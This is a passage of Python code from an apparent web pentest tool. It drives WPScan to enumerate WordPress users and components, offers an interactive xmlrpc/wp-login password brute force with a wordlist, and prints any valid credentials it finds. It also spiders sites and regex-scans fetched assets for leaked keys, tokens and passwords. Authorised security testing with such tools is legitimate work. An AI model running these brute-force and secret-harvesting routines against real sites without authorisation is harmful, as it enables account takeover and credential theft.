        print_warning("WPScan returned code 4 while generating JSON; retrying with more tolerant options.")
        retry_cmd = _wpscan_retry_command(cmd, request_timeout=request_timeout)
        rc2, out2 = _capture_command_output(retry_cmd, interrupt_label="wpscan")
        if out2:
            stdout_text = out2
        rc = rc2
    return rc, stdout_text

def _wpscan_was_interrupted(return_code):
    return return_code is None or return_code in (130, -2, -15)

def run_wpscan_enumeration(target, session, wpscan_path, api_token=None, threads=5, request_timeout=15,
                           enum_flags="u,ap,at", label="WPScan enumeration"):
    tmp_fd, tmp_path = tempfile.mkstemp(suffix=".json", prefix="wpscan_enum_")
    os.close(tmp_fd)
    enum_flags = str(enum_flags or "u,ap,at").strip() or "u,ap,at"
    base_cmd = [
        wpscan_path,
        "--url", target,
        "--enumerate", enum_flags,
        "--request-timeout", str(max(5, int(request_timeout or 15))),
        "-t", str(max(1, int(threads or 5))),
    ]

    visible_cmd = _append_wpscan_common_options(list(base_cmd) + ["--format", "cli"], session, api_token=api_token)
    json_cmd = _append_wpscan_common_options(
        list(base_cmd) + ["--format", "json", "--output", tmp_path, "--no-banner"],
        session,
        api_token=api_token,
    )

    display_rc, stdout_text = _run_wpscan_visible(
        visible_cmd,
        request_timeout=request_timeout,
        label=label,
    )

    json_rc = None
    json_stdout = ""
    interrupted = _wpscan_was_interrupted(display_rc)
    if not interrupted:
        json_rc, json_stdout = _run_wpscan_json(json_cmd, request_timeout=request_timeout)
    else:
        print_info("WPScan interrupted. Skipping JSON generation to return to the menu immediately.")

    data = _load_json_file(tmp_path)
    try:
        os.unlink(tmp_path)
    except Exception:
        pass

    scan = _normalize_wpscan_scan(data, target)
    scan["command"] = _format_external_command(visible_cmd)
    scan["json_command"] = _format_external_command(json_cmd)
    scan["return_code"] = json_rc if json_rc is not None else display_rc
    scan["display_return_code"] = display_rc
    scan["json_return_code"] = json_rc
    scan["interrupted"] = interrupted
    scan["stdout_tail"] = stdout_text[-4000:] if stdout_text else ""
    scan["json_stdout_tail"] = json_stdout[-4000:] if json_stdout else ""
    if not scan["interrupted"] and scan["return_code"] not in (0, None):
        print_warning(f"WPScan finished with code {scan['return_code']}. Whatever could be parsed will be saved.")
    return scan

def run_wpscan_bruteforce(target, session, wpscan_path, users, passlist, api_token=None,
                          threads=20, attack_mode="xmlrpc"):
    result = {
        "attack_mode": attack_mode,
        "users": list(users or []),
        "password_wordlist": passlist,
        "credentials": [],
        "return_code": None,
    }
    if not users or not passlist or not os.path.isfile(passlist):
        print_warning("No users or valid wordlist for WordPress bruteforce.")
        return result

    user_fd, user_path = tempfile.mkstemp(suffix=".txt", prefix="wpscan_users_")
    os.close(user_fd)
    with open(user_path, "w", encoding="utf-8") as f:
        for user in users:
            f.write(str(user).strip() + "\n")

    cmd = [
        wpscan_path,
        "--url", target,
        "--password-attack", attack_mode,
        "-t", str(max(1, int(threads or 20))),
        "-U", user_path,
        "-P", passlist,
        "--format", "cli",
    ]
    cmd = _append_wpscan_common_options(cmd, session, api_token=api_token)

    stdout_text = ""
    try:
        rc, stdout_text = _run_wpscan_visible(cmd, label="WPScan bruteforce")
        result["return_code"] = rc
        result["credentials"] = _extract_wpscan_credentials({}, stdout_text)
        result["command"] = _format_external_command(cmd)
        result["stdout_tail"] = stdout_text[-4000:] if stdout_text else ""
    finally:
        try:
            os.unlink(user_path)
        except Exception:
            pass

    if result["return_code"] not in (0, None):
        print_warning(f"WPScan bruteforce finished with code {result['return_code']}.")
    if result["credentials"]:
        rows = [[f"{Fore.MAGENTA}{c['username']}{Style.RESET_ALL}",
                 f"{Fore.MAGENTA}{c['password']}{Style.RESET_ALL}"]
                for c in result["credentials"]]
        print_table(headers=["USER", "PASSWORD"], rows=rows, title="Valid WordPress credentials:")
    else:
        print_info("WPScan reported no valid credentials.")
    return result

def _wp_summary_value(value, width=90):
    if value is None or value == "":
        return "-"
    text = re.sub(r"\s+", " ", str(value)).strip()
    return text if len(text) <= width else text[: max(0, width - 3)] + "..."

def _wp_component_rows(components):
    rows = []
    for item in components or []:
        if not isinstance(item, dict):
            continue
        try:
            vuln_count = int(item.get("vulnerabilities_count") or 0)
        except Exception:
            vuln_count = 0
        vuln_text = f"{Fore.RED}{vuln_count}{Style.RESET_ALL}" if vuln_count else "0"
        rows.append([
            _wp_summary_value(item.get("name"), 34),
            _wp_summary_value(item.get("version"), 18),
            _wp_summary_value(item.get("latest_version"), 18),
            _wp_summary_value(item.get("confidence"), 8),
            vuln_text,
            _wp_summary_value(item.get("location"), 72),
        ])
    return rows

def print_wpscan_detailed_summary(scan):
    scan = scan or {}
    version = scan.get("version") or {}
    main_theme = scan.get("main_theme") or {}
    plugins = scan.get("plugins") or []
    themes = list(scan.get("themes") or [])
    users = scan.get("users") or []
    vulnerabilities = scan.get("vulnerabilities") or []
    credentials = scan.get("credentials") or []
    interesting = scan.get("interesting_findings") or []

    print_phase("WORDPRESS / WPSCAN SUMMARY")
    core_rows = [
        ["Target", _wp_summary_value(scan.get("target"), 90)],
        ["Detected", "Yes" if scan.get("detected") else "Not confirmed"],
        ["WordPress version", _wp_summary_value(version.get("number"))],
        ["Version status", _wp_summary_value(version.get("status"))],
        ["Version found by", _wp_summary_value(version.get("found_by"), 90)],
        ["Main theme", _wp_summary_value(main_theme.get("name"))],
        ["Plugins found", str(len(plugins))],
        ["Themes found", str(len(themes) + (1 if main_theme else 0))],
        ["Users found", str(len(users))],
        ["Vulnerabilities", str(len(vulnerabilities))],
        ["Valid credentials", str(len(credentials))],
    ]
    print_table(headers=["Field", "Value"], rows=core_rows, title="WordPress general summary:")

    if plugins:
        print_table(
            headers=["Plugin", "Version", "Latest", "Conf.", "Vulns", "Location"],
            rows=_wp_component_rows(plugins),
            alignments=['<', '<', '<', '>', '>', '<'],
            title=f"WordPress plugins found ({len(plugins)}):",
        )
    else:
        print_info("WPScan reported no plugins.")

    theme_items = []
    seen_themes = set()
    if main_theme:
        item = dict(main_theme)
        item["name"] = f"{item.get('name') or '-'} (main)"
        theme_items.append(item)
        seen_themes.add((str(main_theme.get("name") or "").lower(), str(main_theme.get("location") or "").lower()))
    for theme in themes:
        if not isinstance(theme, dict):
            continue
        key = (str(theme.get("name") or "").lower(), str(theme.get("location") or "").lower())
        if key in seen_themes:
            continue
        seen_themes.add(key)
        theme_items.append(theme)
    if theme_items:
        print_table(
            headers=["Theme", "Version", "Latest", "Conf.", "Vulns", "Location"],
            rows=_wp_component_rows(theme_items),
            alignments=['<', '<', '<', '>', '>', '<'],
            title=f"WordPress themes found ({len(theme_items)}):",
        )
    else:
        print_info("WPScan reported no themes.")

    if users:
        user_rows = [
            [
                _wp_summary_value(u.get("username"), 32),
                _wp_summary_value(u.get("id"), 8),
                _wp_summary_value(u.get("name"), 34),
                _wp_summary_value(u.get("found_by"), 72),
            ]
            for u in users if isinstance(u, dict)
        ]
        print_table(
            headers=["User", "ID", "Name", "Found by"],
            rows=user_rows,
            alignments=['<', '<', '<', '<'],
            title=f"WordPress users found ({len(user_rows)}):",
        )
    else:
        print_info("WPScan reported no users.")

    if interesting:
        interesting_rows = [
            [
                _wp_summary_value(i.get("type"), 24),
                _wp_summary_value(i.get("to_s"), 84),
                _wp_summary_value(i.get("url"), 84),
                _wp_summary_value(i.get("confidence"), 8),
            ]
            for i in interesting if isinstance(i, dict)
        ]
        print_table(
            headers=["Type", "Detail", "URL", "Conf."],
            rows=interesting_rows,
            alignments=['<', '<', '<', '>'],
            title=f"Interesting WordPress findings ({len(interesting_rows)}):",
        )

    if vulnerabilities:
        vuln_rows = []
        for vuln in vulnerabilities:
            if not isinstance(vuln, dict):
                continue
            refs = ", ".join(vuln.get("references") or [])
            vuln_rows.append([
                _wp_summary_value(vuln.get("component_type"), 14),
                _wp_summary_value(vuln.get("component"), 30),
                _wp_summary_value(vuln.get("title"), 80),
                _wp_summary_value(vuln.get("fixed_in"), 18),
                _wp_summary_value(refs, 70),
            ])
        print_table(
            headers=["Type", "Component", "Title", "Fixed in", "References"],
            rows=vuln_rows,
            alignments=['<', '<', '<', '<', '<'],
            title=f"WordPress vulnerabilities ({len(vuln_rows)}):",
        )
    else:
        print_info("WPScan reported no vulnerabilities.")

    if credentials:
        cred_rows = [
            [
                f"{Fore.MAGENTA}{_wp_summary_value(c.get('username'), 32)}{Style.RESET_ALL}",
                f"{Fore.MAGENTA}{_wp_summary_value(c.get('password'), 40)}{Style.RESET_ALL}",
                _wp_summary_value(c.get("source") or "wpscan", 16),
            ]
            for c in credentials if isinstance(c, dict)
        ]
        print_table(
            headers=["User", "Password", "Source"],
            rows=cred_rows,
            alignments=['<', '<', '<'],
            title=f"Valid WordPress credentials ({len(cred_rows)}):",
            border_color=Fore.GREEN,
        )

def _technology_to_text(item):
    if isinstance(item, dict):
        return " ".join(str(item.get(k) or "") for k in ("name", "detail", "version", "value"))
    return str(item or "")

def _whatweb_detects_wordpress(technologies):
    matches = []
    for item in technologies or []:
        text = _technology_to_text(item).strip()
        if not text:
            continue
        if re.search(r"\bwordpress\b", text, re.I):
            matches.append(text)
    return bool(matches), matches

def _manual_wordpress_signal(signals, name, evidence, source):
    evidence = str(evidence or "").strip()
    key = (name, evidence[:160], source)
    for item in signals:
        if item.get("key") == key:
            return
    signals.append({
        "key": key,
        "name": name,
        "evidence": evidence[:240],
        "source": source,
    })

def _scan_text_for_wordpress_patterns(text, source, signals):
    if not text:
        return
    patterns = [
        ("meta generator", r'<meta[^>]+name=["\']generator["\'][^>]+content=["\'][^"\']*wordpress[^"\']*["\']'),
        ("wp-content", r'/(?:wp-content)/(?:plugins|themes|uploads)/[^"\'<>\s]+'),
        ("wp-includes", r'/(?:wp-includes)/[^"\'<>\s]+'),
        ("wp-json", r'(?:/wp-json/|rest_route=/?wp/|wp/v2)'),
        ("wp assets", r'(?:wp-emoji-release|wp-block-library|wp-polyfill|wp-embed|wpApiSettings)'),
        ("wordpress text", r'\bWordPress\b'),
    ]
    for name, pattern in patterns:
        match = re.search(pattern, text, re.I)
        if match:
            _manual_wordpress_signal(signals, name, match.group(0), source)

def _manual_wordpress_detection(target, session):
    signals = []
    checked_urls = []

    def fetch(url, method="GET"):
        checked_urls.append(url)
        try:
            if method == "HEAD":
                return session.head(url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
            return session.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
        except Exception:
            return None

    resp = fetch(target)
    if resp is not None:
        _scan_text_for_wordpress_patterns(resp.text or "", "html", signals)
        header_text = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        _scan_text_for_wordpress_patterns(header_text, "headers", signals)
        if "xmlrpc.php" in str(resp.headers.get("X-Pingback", "")).lower():
            _manual_wordpress_signal(signals, "x-pingback", resp.headers.get("X-Pingback"), "headers")

    relative_base = target if str(target).endswith("/") else f"{target}/"
    raw_probes = [
        (urljoin(relative_base, "wp-login.php"), "login"),
        (urljoin(target, "/wp-login.php"), "login"),
        (urljoin(relative_base, "wp-json/"), "rest api"),
        (urljoin(target, "/wp-json/"), "rest api"),
        (urljoin(relative_base, "xmlrpc.php"), "xmlrpc"),
        (urljoin(target, "/xmlrpc.php"), "xmlrpc"),
    ]
    probes = []
    seen_probe_urls = set()
    for url, probe_type in raw_probes:
        if url in seen_probe_urls:
            continue
        seen_probe_urls.add(url)
        probes.append((url, probe_type))
    for url, probe_type in probes:
        probe_resp = fetch(url)
        if probe_resp is None:
            continue
        body = probe_resp.text or ""
        body_low = body.lower()
        if probe_type == "login" and probe_resp.status_code < 500:
            if "wp-submit" in body_low or "wordpress" in body_low or "wp-login.php" in body_low:
                _manual_wordpress_signal(signals, "wp-login.php", f"HTTP {probe_resp.status_code}", url)
        elif probe_type == "rest api" and probe_resp.status_code < 500:
            if "wp/v2" in body_low or '"namespaces"' in body_low or '"routes"' in body_low:
                _manual_wordpress_signal(signals, "wp-json api", f"HTTP {probe_resp.status_code}", url)
        elif probe_type == "xmlrpc" and probe_resp.status_code in (200, 405):
            if "xml-rpc server accepts post requests only" in body_low or "xmlrpc" in body_low:
                _manual_wordpress_signal(signals, "xmlrpc.php", f"HTTP {probe_resp.status_code}", url)

    for item in signals:
        item.pop("key", None)
    strong_signals = [s for s in signals if s.get("name") != "wordpress text"]
    return {
        "detected": bool(strong_signals) or len(signals) >= 2,
        "source": "manual",
        "signals": signals,
        "checked_urls": checked_urls,
    }

def detect_wordpress_for_full_pentest(target, session):
    general = SCAN_DATA.get("general") or {}
    technologies = general.get("technologies") or []
    tech_source = general.get("technologies_source") or "unknown"

    if tech_source == "whatweb":
        detected, matches = _whatweb_detects_wordpress(technologies)
        if detected:
            detection = {
                "detected": True,
                "source": "whatweb",
                "matches": matches,
            }
            SCAN_DATA["wordpress_detection"] = detection
            print_good(f"WhatWeb detected WordPress: {', '.join(matches[:3])}")
            return detection
        print_info("WhatWeb did not detect WordPress. Running manual pattern detection.")
    else:
        print_info("No useful WhatWeb detection for WordPress. Running manual pattern detection.")

    detection = _manual_wordpress_detection(target, session)
    SCAN_DATA["wordpress_detection"] = detection
    if detection.get("detected"):
        signal_names = sorted({s.get("name", "") for s in detection.get("signals", []) if s.get("name")})
        print_good(f"Manual detection consistent with WordPress: {', '.join(signal_names[:5])}")
    else:
        print_info("Not enough manual WordPress patterns found.")
    return detection

def run_wordpress_attacks_if_detected(target, session):
    detection = detect_wordpress_for_full_pentest(target, session)
    if not detection.get("detected"):
        print_info("Target not identified as WordPress. Skipping WPScan in full pentest.")
        return None
    return run_wordpress_attacks(target, session)

def run_wpscan_user_enumeration_if_wordpress(target, session, existing_users=None):
    existing_users = list(existing_users or [])
    detection = detect_wordpress_for_full_pentest(target, session)
    if not detection.get("detected"):
        print_info("Target not identified as WordPress. Keeping the usual user enumeration.")
        return existing_users

    wpscan_path = check_wpscan()
    if not wpscan_path:
        if not install_wpscan():
            print_warning("WPScan not available. Keeping only the usual user enumeration.")
            return existing_users
        wpscan_path = check_wpscan()
        if not wpscan_path:
            print_warning("WPScan is still not available.")
            return existing_users

    api_token = os.environ.get("WPSCAN_API_TOKEN") or os.environ.get("WPVULNDB_API_TOKEN") or ""
    if api_token:
        print_info("Using WPScan/WPVulnDB API token from environment variable.")

    scan = run_wpscan_enumeration(
        target,
        session,
        wpscan_path,
        api_token=api_token,
        threads=max(5, THREADS),
        request_timeout=max(15, DEFAULT_TIMEOUT),
        enum_flags="u",
        label="WPScan user enumeration",
    )
    SCAN_DATA["wordpress"] = scan
    if scan.get("interrupted"):
        print_info("WPScan enumeration interrupted. Continuing with users found by the usual methods.")
        return existing_users

    wp_users = [u.get("username") for u in scan.get("users") or [] if isinstance(u, dict) and u.get("username")]
    if wp_users:
        merged_users = sorted(set(existing_users + wp_users))
        SCAN_DATA["users"] = merged_users
        for user in wp_users:
            _append_finding_once(f"[WP:USER] {user}")
        print_table(
            headers=["User"],
            rows=[[u] for u in wp_users],
            title=f"WordPress users identified with WPScan ({len(wp_users)}):",
        )
        return merged_users

    print_info("WPScan did not identify additional WordPress users.")
    return existing_users

def run_wordpress_attacks(target, session):
    print_phase("WORDPRESS ENUMERATION & ATTACKS")
    wpscan_path = check_wpscan()
    if not wpscan_path:
        if not install_wpscan():
            print_warning("Skipping WordPress/WPScan.")
            return None
        wpscan_path = check_wpscan()
        if not wpscan_path:
            print_warning("WPScan is still not available.")
            return None

    api_token = os.environ.get("WPSCAN_API_TOKEN") or os.environ.get("WPVULNDB_API_TOKEN") or ""
    if api_token:
        print_info("Using WPScan/WPVulnDB API token from environment variable.")
    else:
        try:
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} WPVulnDB/WPScan API token (optional, Enter to skip):")
            api_token = getpass.getpass("> ").strip()
        except (KeyboardInterrupt, EOFError):
            api_token = ""

    enum_threads = max(5, THREADS)
    scan = run_wpscan_enumeration(target, session, wpscan_path, api_token=api_token, threads=enum_threads, request_timeout=max(15, DEFAULT_TIMEOUT))
    SCAN_DATA["wordpress"] = scan
    if scan.get("interrupted"):
        print_info("WPScan enumeration interrupted. Returning to the main flow.")
        return scan

    version = scan.get("version") or {}
    users = [u.get("username") for u in scan.get("users") or [] if u.get("username")]
    vulnerabilities = scan.get("vulnerabilities") or []
    plugins = scan.get("plugins") or []
    main_theme = scan.get("main_theme") or {}

    if not scan.get("detected"):
        print_warning("WPScan did not confirm the target is WordPress.")
    else:
        summary_rows = [
            ["WordPress", version.get("number") or "detectado"],
            ["Version status", version.get("status") or "-"],
            ["Main theme", main_theme.get("name") or "-"],
            ["Detected plugins", str(len(plugins))],
            ["Users", str(len(users))],
            ["Vulnerabilities", str(len(vulnerabilities))],
        ]
        print_table(headers=["Field", "Value"], rows=summary_rows, title="WordPress Summary:")

    if version.get("number"):
        _append_finding_once(f"[WP] WordPress {version.get('number')} ({version.get('status') or 'unknown status'})")
    for plugin in plugins:
        if isinstance(plugin, dict) and plugin.get("name"):
            _append_finding_once(f"[WP:PLUGIN] {plugin.get('name')} {plugin.get('version') or 'unknown version'}")
    if main_theme.get("name"):
        _append_finding_once(f"[WP:THEME] {main_theme.get('name')} {main_theme.get('version') or 'unknown version'}")
    for theme in scan.get("themes") or []:
        if isinstance(theme, dict) and theme.get("name"):
            _append_finding_once(f"[WP:THEME] {theme.get('name')} {theme.get('version') or 'unknown version'}")
    for user in users:
        _append_finding_once(f"[WP:USER] {user}")
    for vuln in vulnerabilities:
        _append_finding_once(
            f"[WP:VULN] {vuln.get('component_type')}:{vuln.get('component')} - {vuln.get('title')}"
        )

    if users:
        SCAN_DATA["users"] = sorted(set((SCAN_DATA.get("users") or []) + users))
        user_rows = [[u] for u in users]
        print_table(headers=["User"], rows=user_rows, title="WordPress users identified:")

        try:
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Launch brute force with WPScan on these users? [Y/n]:")
            do_brute = input("> ").strip().lower() != 'n'
        except (KeyboardInterrupt, EOFError):
            do_brute = False
        if do_brute:
            passlist = input_path(
                "Path to password wordlist (Enter = rockyou/SecLists if present): "
            ).strip()
            if not passlist:
                passlist = _default_wordpress_password_wordlist()
                if passlist:
                    print_info(f"Using default wordlist: {passlist}")
            if not passlist or not os.path.isfile(passlist):
                print_warning("No valid password wordlist. Skipping WordPress bruteforce.")
            else:
                try:
                    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Attack method [xmlrpc/wp-login] (default xmlrpc):")
                    mode_in = input("> ").strip().lower()
                except (KeyboardInterrupt, EOFError):
                    mode_in = ""
                attack_mode = mode_in if mode_in in ("xmlrpc", "wp-login") else "xmlrpc"
                brute = run_wpscan_bruteforce(
                    target, session, wpscan_path, users, passlist,
                    api_token=api_token, threads=max(20, THREADS),
                    attack_mode=attack_mode,
                )
                scan["bruteforce"] = brute
                scan["credentials"] = brute.get("credentials", [])
                if brute.get("credentials"):
                    _merge_credentials("bruteforce_credentials", brute["credentials"])
                    for cred in brute["credentials"]:
                        _append_finding_once(f"[CRED:WP] {cred.get('username')}:{cred.get('password')}")
    else:
        print_info("WPScan did not identify users; skipping automatic brute force.")

    SCAN_DATA["wordpress"] = scan
    print_wpscan_detailed_summary(scan)
    return scan

def spider_website(target, session, max_pages=500, max_depth=3, use_robots=True):
    print_info(f"Starting spidering on {target} (max pages: {max_pages}, depth: {max_depth})")
    base_parsed = urlparse(target)
    base_domain = base_parsed.netloc

    robots_parser = None
    if use_robots:
        robots_url = urljoin(target, "/robots.txt")
        try:
            rp = RobotFileParser()
            rp.set_url(robots_url)
            rp.read()
            robots_parser = rp
            print_info("robots.txt loaded successfully.")
        except (OSError, ValueError) as e:
            print_warning(f"Could not load robots.txt ({type(e).__name__}: {e}). Continuing without restrictions.")

    visited = set()
    urls_queue = deque()
    urls_queue.append((target, 0))
    discovered_urls = set()
    all_params = set()
    forms_found = []
    form_keys_seen = set()
    discovered_urls.add(target)
    
    with tqdm(total=max_pages, desc="Spidering", unit="pg", ncols=80, disable=not HAS_TQDM) as pbar:
        while urls_queue and len(visited) < max_pages:
            current_url, depth = urls_queue.popleft()
            if current_url in visited:
                continue
            if depth > max_depth:
                continue
            visited.add(current_url)
            if HAS_TQDM:
                pbar.update(1)
                pbar.set_postfix({"Now": os.path.basename(current_url)[:30], "Disc": len(discovered_urls)})
            else:
                if len(visited) % 20 == 0:
                    print_info(f"Spidering progress: {len(visited)} pages visited, {len(discovered_urls)} URLs discovered")
            
            try:
                try:
                    resp = session.get(current_url, timeout=DEFAULT_TIMEOUT)
                except requests.exceptions.TooManyRedirects:
                    try:
                        resp = session.get(current_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                    except Exception:
                        continue
                if resp.status_code != 200:
                    continue
                content_type = resp.headers.get('Content-Type', '')
                if 'text/html' not in content_type:
                    continue
                
                if HAS_BS4:
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    for link in soup.find_all('a', href=True):
                        href = link['href'].strip()
                        if not href or href.startswith('#') or href.startswith('javascript:'):
                            continue
                        absolute = urljoin(current_url, href)
                        parsed_abs = urlparse(absolute)
                        if parsed_abs.netloc != base_domain:
                            continue
                        clean_abs = parsed_abs._replace(fragment='')
                        abs_url = urlunparse(clean_abs)
                        if use_robots and robots_parser and not robots_parser.can_fetch("*", abs_url):
                            continue
                        if abs_url not in discovered_urls:
                            discovered_urls.add(abs_url)
                            urls_queue.append((abs_url, depth+1))
                    
                    for form in soup.find_all('form'):
                        action = form.get('action', '')
                        method = form.get('method', 'get').upper()
                        form_action_url = urljoin(current_url, action) if action else current_url
                        if action:
                            parsed_f = urlparse(form_action_url)
                            if parsed_f.netloc == base_domain:
                                clean_f = parsed_f._replace(fragment='')
                                f_url = urlunparse(clean_f)
                                if f_url not in discovered_urls:
                                    discovered_urls.add(f_url)
                                    urls_queue.append((f_url, depth+1))
                        form_inputs = []
                        for inp in form.find_all(['input', 'textarea', 'select']):
                            name = inp.get('name')
                            if not name:
                                continue
                            itype = (inp.get('type') or '').lower()
                            if itype in ('submit', 'button', 'image', 'reset', 'file'):
                                continue
                            form_inputs.append(name)
                            all_params.add(name)
                        if not form_inputs:
                            continue
                        form_key = (
                            form_action_url,
                            method,
                            tuple(sorted(set(form_inputs)))
                        )
                        if form_key in form_keys_seen:
                            continue
                        form_keys_seen.add(form_key)
                        forms_found.append({
                            'page_url': current_url,
                            'url': form_action_url,
                            'action': form_action_url,
                            'method': method,
                            'inputs': sorted(set(form_inputs)),
                        })
                    
                    for u in list(discovered_urls):
                        parsed_u = urlparse(u)
                        if parsed_u.query:
                            for key in parse_qs(parsed_u.query).keys():
                                all_params.add(key)
                else:
                    hrefs = re.findall(r'href=["\'](.*?)["\']', resp.text)
                    for href in hrefs:
                        if href and not href.startswith('#') and not href.startswith('javascript:'):
                            absolute = urljoin(current_url, href)
                            parsed_abs = urlparse(absolute)
                            if parsed_abs.netloc != base_domain:
                                continue
                            if absolute not in discovered_urls:
                                discovered_urls.add(absolute)
                                urls_queue.append((absolute, depth+1))
            except Exception as e:
                print_error(f"Error spidering {current_url}: {e}")
                continue
    
    print_good(f"Spidering completed. Pages visited: {len(visited)}, unique URLs discovered: {len(discovered_urls)}")
    if all_params:
        print_info(f"Unique parameters found: {len(all_params)} -> {', '.join(list(all_params)[:20])}")
    if forms_found:
        print_info(f"Forms detected during spidering: {len(forms_found)}")
    return discovered_urls, all_params, forms_found

_SRC_MAX_BYTES = 2 * 1024 * 1024
_SRC_SNIPPET_CHARS = 140
_SRC_MAX_FINDINGS_PER_FILE = 30

_SOURCE_PATTERNS = [
    ("critical", "PEM private key",
     re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----"), False),
    ("critical", "DB connection string with credentials",
     re.compile(r"\b(?:mongodb(?:\+srv)?|mysql|postgres(?:ql)?|redis|amqps?|mssql|jdbc:[a-z]+)://[^\s\"'<>]*:[^\s\"'<>@]+@[^\s\"'<>]+", re.IGNORECASE), False),
    ("high", "AWS Access Key ID",
     re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"), False),
    ("high", "AWS Secret Access Key",
     re.compile(r"(?i)aws[_\-]?(?:secret|sk)[_\-]?(?:access[_\-]?)?key[\"'\s:=]{1,8}[\"']?([A-Za-z0-9/+=]{40})"), True),
    ("high", "Google API Key",
     re.compile(r"\bAIza[0-9A-Za-z\-_]{35}\b"), False),
    ("high", "GitHub token",
     re.compile(r"\bgh[pousr]_[A-Za-z0-9]{30,}\b"), False),
    ("high", "Slack token",
     re.compile(r"\bxox[abpros]-[A-Za-z0-9\-]{10,}\b"), False),
    ("high", "Stripe live secret key",
     re.compile(r"\bsk_live_[0-9a-zA-Z]{20,}\b"), False),
    ("high", "JWT token",
     re.compile(r"\beyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{4,}\b"), False),
    ("high", "Hardcoded credential",
     re.compile(r"(?i)(?:password|passwd|pwd|secret|api[_\-]?key|access[_\-]?key|client[_\-]?secret|auth[_\-]?token|bearer)[\"'\s:=]{1,8}[\"']([^\"'\s]{4,80})[\"']"), True),
    ("medium", "Basic Auth in URL",
     re.compile(r"\bhttps?://[A-Za-z0-9._\-]+:[^\s\"'<>@/]+@[A-Za-z0-9._\-]+"), False),
    ("medium", "Sensitive HTML comment",
     re.compile(
         r"<!--\s*("
         r"(?:(?!-->)[\s\S]){0,400}"
         r"(?:password|passwd|pwd|secret|api[_\-]?key|access[_\-]?key|"
         r"private[_\-]?key|client[_\-]?secret|auth[_\-]?token|bearer|"
         r"credentials|hardcoded|backdoor|deprecated|do not commit|"
         r"todo[: ]|fixme[: ]|xxx[: ]|hack[: ]|"
         r"backup\s+(?:file|path|server|db)|"
         r"internal\s+(?:use|api|server|tool)|"
         r"debug\s+(?:enabled|mode|key|token))"
         r"(?:(?!-->)[\s\S]){0,400}"
         r")\s*-->",
         re.IGNORECASE), True),
    ("medium", "Exposed source map",
     re.compile(r"//[#@]\s*sourceMappingURL\s*=\s*([^\s\"']+)"), True),
    ("medium", "Hardcoded private IP",
     re.compile(r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})\b"), False),
    ("low", "Sensitive path referenced",
     re.compile(r"[\"'](/(?:admin|adminer|debug|console|h2-console|phpmyadmin|backup|backups|dump|wp-admin|actuator|internal|staging|.git|.env)[A-Za-z0-9_\-/.]*)[\"']"), True),
    ("low", "Exposed email",
     re.compile(r"\b[A-Za-z0-9_.+\-]+@[A-Za-z0-9\-]+\.[A-Za-z0-9.\-]+\b"), False),
]

_SOURCE_ASSET_EXT = ('.js', '.mjs', '.jsx', '.ts', '.tsx', '.json', '.map', '.css', '.txt', '.xml', '.yml', '.yaml', '.env')
_SOURCE_TEXT_CT = ('text/', 'application/javascript', 'application/json', 'application/xml',
                   'application/x-yaml', 'application/yaml', 'application/octet-stream')


def _is_source_text_response(content_type, url):
    ct = (content_type or '').lower()
    if any(t in ct for t in _SOURCE_TEXT_CT):
        return True
    path = urlparse(url).path.lower()
    return path.endswith(_SOURCE_ASSET_EXT)


def _download_text_capped(session, url, max_bytes=_SRC_MAX_BYTES):
    """Download the body as text with a byte cap (avoids huge downloads)."""
    try:
        resp = session.get(url, timeout=DEFAULT_TIMEOUT, stream=True, allow_redirects=True)
    except requests.RequestException as e:
        return None, None, str(e)
    try:
        if resp.status_code != 200:
            return None, resp.headers.get('Content-Type', ''), f"status {resp.status_code}"
        clen = resp.headers.get('Content-Length')
        if clen and clen.isdigit() and int(clen) > max_bytes:
            return None, resp.headers.get('Content-Type', ''), f"too large ({clen} bytes)"
        buf = bytearray()
        for chunk in resp.iter_content(chunk_size=16384):
            if not chunk:
                continue
            buf.extend(chunk)
            if len(buf) >= max_bytes:
                break
        encoding = resp.encoding or 'utf-8'
        try:
            text = buf.decode(encoding, errors='replace')
        except (LookupError, TypeError):
            text = buf.decode('utf-8', errors='replace')
        return text, resp.headers.get('Content-Type', ''), None
    finally:
        try:
            resp.close()
        except Exception:
            pass


def _extract_linked_assets(html_text, base_url, base_netloc):
    """Return same-domain script/link/source/.map URLs referenced in the HTML."""
    assets = set()
    if not html_text:
        return assets
    if HAS_BS4:
        try:
            soup = BeautifulSoup(html_text, 'html.parser')
            for tag in soup.find_all(['script', 'link', 'iframe', 'source', 'img', 'a']):
                src = tag.get('src') or tag.get('href')
                if not src:
                    continue
                absu = urljoin(base_url, src.strip())
                parsed = urlparse(absu)
                if parsed.scheme not in ('http', 'https'):
                    continue
                if parsed.netloc != base_netloc:
                    continue
                path = parsed.path.lower()
                if path.endswith(_SOURCE_ASSET_EXT):
                    assets.add(urlunparse(parsed._replace(fragment='')))
        except Exception:
            pass
    else:
        for m in re.finditer(r'(?:src|href)\s*=\s*["\']([^"\']+)["\']', html_text, re.IGNORECASE):
            absu = urljoin(base_url, m.group(1).strip())
            parsed = urlparse(absu)
            if parsed.netloc == base_netloc and parsed.path.lower().endswith(_SOURCE_ASSET_EXT):
                assets.add(urlunparse(parsed._replace(fragment='')))
    return assets


def _scan_text_for_secrets(text, source_url):
    """Apply the catalog patterns to the text and return a list of findings."""
    findings = []
    seen = set()
    if not text:
        return findings
    for severity, label, regex, has_group in _SOURCE_PATTERNS:
        try:
            matches = list(regex.finditer(text))
        except re.error:
            continue
        for m in matches:
            value = m.group(1) if (has_group and m.lastindex) else m.group(0)
            value = (value or "").strip()
            if not value:
                continue
            if label == "Exposed email" and value.lower().endswith(('.png', '.jpg', '.svg', '.gif', '.webp')):
                continue
            if label == "Sensitive HTML comment":
                low = value.lower()
                ui_only = ("footer", "header", "navbar", "nav bar", "sidebar",
                           "logo", "icon", "button", "banner", "carousel",
